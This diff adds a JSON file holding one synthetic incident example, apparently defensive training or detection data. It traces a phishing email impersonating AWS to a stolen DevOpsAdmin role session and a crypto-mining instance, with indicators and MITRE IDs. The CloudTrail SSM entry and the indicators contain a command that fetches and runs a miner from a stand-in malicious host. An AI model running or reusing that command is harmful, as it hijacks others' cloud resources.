@@ -1,0 +1,175 @@
+{
+  "examples": [
+    {
+      "scenario": "Phishing email harvests cloud user credentials leading to unauthorized deployment of a malicious crypto-mining workload in AWS environment.",
+      "technical_data": {
+        "email_headers": "Return-Path: <support@amaz0n-security.com>\r\nReceived: from mail.amaz0n-security.com (mail.amaz0n-security.com [198.51.100.42])\r\n\tby inbound.mail.example.com with ESMTPS id v7G4s2hT\r\n\tfor <victim@company.com>; Tue, 11 Apr 2023 12:45:32 -0700 (PDT)\r\nX-Spam-Flag: NO\r\nX-Spam-Score: 1.3\r\nX-Phishing-Confidence: 85\r\nX-Mailer: PHPMailer 6.5.0 (https://github.com/PHPMailer/PHPMailer)\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\nSubject: [Action Required] AWS Account Security Notice\r\nFrom: Amazon Web Services <support@amaz0n-security.com>\r\nTo: victim@company.com\r\nMessage-ID: <20230411124532.1234567@mail.amaz0n-security.com>",
+        "email_body_html": "<html><body><p>Dear AWS User,</p><p>We have detected suspicious activity on your AWS account. Please verify your credentials immediately to avoid service interruption.</p><p><a href=\"https://aws-login-secure.com/login?user=victim@company.com\">Verify your account here</a></p><p>Thank you,<br>AWS Security Team</p></body></html>",
+        "phishing_url": "https://aws-login-secure.com/login?user=victim@company.com",
+        "domain_registration": {
+          "domain": "aws-login-secure.com",
+          "registrar": "NameCheap, Inc.",
+          "creation_date": "2023-04-05T11:23:45Z",
+          "registrant": {
+            "name": "Redacted for privacy",
+            "organization": "Redacted",
+            "country": "RU"
+          },
+          "dns_records": [
+            {
+              "type": "A",
+              "value": "198.51.100.42",
+              "ttl": 3600
+            },
+            {
+              "type": "MX",
+              "value": "mail.aws-login-secure.com",
+              "ttl": 3600
+            }
+          ]
+        },
+        "smtp_transaction_log": "220 mail.aws-login-secure.com ESMTP Postfix\r\nEHLO attacker-host\r\n250-mail.aws-login-secure.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<support@amaz0n-security.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<victim@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email content]\r\n.\r\n250 2.0.0 Ok: queued as 5F2A3C01\r\nQUIT\r\n221 2.0.0 Bye",
+        "oauth_token_request": {
+          "timestamp": "2023-04-11T12:50:15Z",
+          "source_ip": "203.0.113.77",
+          "api_endpoint": "https://sts.amazonaws.com/",
+          "parameters": {
+            "Action": "AssumeRole",
+            "RoleArn": "arn:aws:iam::123456789012:role/DevOpsAdmin",
+            "RoleSessionName": "phished-session-20230411",
+            "Version": "2011-06-15"
+          },
+          "response": {
+            "Credentials": {
+              "AccessKeyId": "ASIAxxxxxxxxxxxxxx",
+              "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYzEXAMPLEKEY",
+              "SessionToken": "FQoGZXIvYXdzEP///////////wEaDMyNjQyNDg1MDMyMTk1IjAW...",
+              "Expiration": "2023-04-11T18:50:15Z"
+            }
+          }
+        },
+        "cloudtrail_logs": [
+          {
+            "eventTime": "2023-04-11T12:51:05Z",
+            "eventSource": "ec2.amazonaws.com",
+            "eventName": "RunInstances",
+            "userIdentity": {
+              "type": "AssumedRole",
+              "arn": "arn:aws:sts::123456789012:assumed-role/DevOpsAdmin/phished-session-20230411",
+              "principalId": "AROAXXXXXXX:phished-session-20230411"
+            },
+            "requestParameters": {
+              "imageId": "ami-0abcdef1234567890",
+              "instanceType": "t3.micro",
+              "keyName": "company-prod-key",
+              "securityGroupIds": [
+                "sg-0a1b2c3d4e5f67890"
+              ],
+              "userData": "IyEvYmluL2Jhc2gKZWNobyAibWluZXIgZG93bmxvYWRlZCI+L2hvbWUvYW1hem9uLWNyeXB0by5sb2cKZWNobyAiYmFzaCAtaSA+IC9kZXYvbnVsbCAyPiYxIiA+IC9ob21lL2F3cy1jcnlwdG8uc2giCg=="
+            },
+            "responseElements": {
+              "instancesSet": {
+                "items": [
+                  {
+                    "instanceId": "i-0abcd1234efgh5678"
+                  }
+                ]
+              }
+            },
+            "sourceIPAddress": "203.0.113.77",
+            "userAgent": "aws-cli/2.4.8 Python/3.8.8 Linux/5.15.49-60.70.amzn2.x86_64 exe/x86_64.amzn.2 prompt/off command/ec2 run-instances"
+          },
+          {
+            "eventTime": "2023-04-11T12:51:10Z",
+            "eventSource": "ec2.amazonaws.com",
+            "eventName": "CreateTags",
+            "userIdentity": {
+              "type": "AssumedRole",
+              "arn": "arn:aws:sts::123456789012:assumed-role/DevOpsAdmin/phished-session-20230411"
+            },
+            "requestParameters": {
+              "resources": [
+                "i-0abcd1234efgh5678"
+              ],
+              "tags": [
+                {
+                  "key": "Name",
+                  "value": "CryptoMiner-Node"
+                },
+                {
+                  "key": "Environment",
+                  "value": "Production"
+                }
+              ]
+            },
+            "sourceIPAddress": "203.0.113.77"
+          },
+          {
+            "eventTime": "2023-04-11T12:52:00Z",
+            "eventSource": "ssm.amazonaws.com",
+            "eventName": "SendCommand",
+            "userIdentity": {
+              "type": "AssumedRole",
+              "arn": "arn:aws:sts::123456789012:assumed-role/DevOpsAdmin/phished-session-20230411"
+            },
+            "requestParameters": {
+              "documentName": "AWS-RunShellScript",
+              "parameters": {
+                "commands": [
+                  "curl -o /tmp/miner https://malicious-domain.com/miner && chmod +x /tmp/miner && /tmp/miner --url stratum+tcp://pool.example.com:3333 --user cryptouser.worker1"
+                ]
+              },
+              "targets": [
+                {
+                  "key": "InstanceIds",
+                  "values": [
+                    "i-0abcd1234efgh5678"
+                  ]
+                }
+              ]
+            },
+            "sourceIPAddress": "203.0.113.77"
+          }
+        ],
+        "base64_user_data_decoded": "#!/bin/bash\necho \"miner downloaded\">/home/amazon-crypto.log\necho \"bash -i > /dev/null 2>&1\" > /home/aws-crypto.sh\n",
+        "iam_policy_misconfiguration": {
+          "policyName": "DevOpsAdmin",
+          "policyDocument": {
+            "Version": "2012-10-17",
+            "Statement": [
+              {
+                "Effect": "Allow",
+                "Action": [
+                  "ec2:RunInstances",
+                  "ec2:CreateTags",
+                  "ssm:SendCommand",
+                  "iam:PassRole"
+                ],
+                "Resource": "*"
+              }
+            ]
+          }
+        }
+      },
+      "indicators": {
+        "phishing_domain": "aws-login-secure.com",
+        "phishing_ip": "198.51.100.42",
+        "compromised_source_ip": "203.0.113.77",
+        "assumed_role_session_name": "phished-session-20230411",
+        "malicious_instance_id": "i-0abcd1234efgh5678",
+        "malicious_user_data_base64": "IyEvYmluL2Jhc2gKZWNobyAibWluZXIgZG93bmxvYWRlZCI+L2hvbWUvYW1hem9uLWNyeXB0by5sb2cKZWNobyAiYmFzaCAtaSA+IC9kZXYvbnVsbCAyPiYxIiA+IC9ob21lL2F3cy1jcnlwdG8uc2giCg==",
+        "malicious_ssm_command": "curl -o /tmp/miner https://malicious-domain.com/miner && chmod +x /tmp/miner && /tmp/miner --url stratum+tcp://pool.example.com:3333 --user cryptouser.worker1"
+      },
+      "detection_method": "Monitor CloudTrail logs for AssumeRole activities from unusual IPs or sessions, alert on EC2 RunInstances with suspicious user data scripts, correlate with IAM roles having broad privileges like 'DevOpsAdmin', and detect phishing emails via email gateway with suspicious sending domains. Use behavior analytics to detect newly created instances tagged with crypto-mining related names and SSM commands executing network downloads to unknown hosts.",
+      "relevant_mitre_techniques": [
+        "T1078.004",
+        "T1059.004",
+        "T1086",
+        "T1566.001",
+        "T1071.001",
+        "T1496",
+        "T1098"
+      ]
+    }
+  ]
+}
